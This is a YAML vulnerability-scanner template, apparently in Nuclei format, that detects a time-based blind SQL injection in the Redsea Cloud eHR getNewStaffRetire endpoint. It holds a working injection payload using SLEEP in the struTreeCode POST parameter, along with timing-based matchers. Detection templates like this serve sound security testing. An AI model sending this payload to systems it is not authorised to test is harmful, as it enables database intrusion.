id: poc-yaml-hr-soft-getnewstaffretire-sqli
info:
  name: \u7EA2\u6D77\u4E91eHR getNewStaffRetire SQL\u6CE8\u5165\u6F0F\u6D1E
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1)+2}}'

flow: |
  http(1) && http(2)

http:
  - id: "1"
    method: GET
    path:
      - "{{BaseURL}}/RedseaPlatform/"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - "/RedseaPlatform/skins/images/favicon.ico"
        part: body

  - id: "2"
    method: POST
    path:
      - "{{BaseURL}}/RedseaPlatform/BossIndex.mob"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "method=getNewStaffRetire&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP({{t1}})))ShXk)+AND+%27qmyT%27=%27qmyT"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - "\"meg\":\"\u5904\u7406\u6210\u529F\""
          - "\"jsonList\":"
        part: body
      - type: word
        words:
          - "text/json"
        part: header
      - type: dsl
        dsl:
          - duration > to_number(t1)
          - duration < to_number(t2)
      - type: word
        words:
          - "<"
        part: body
        negative: true
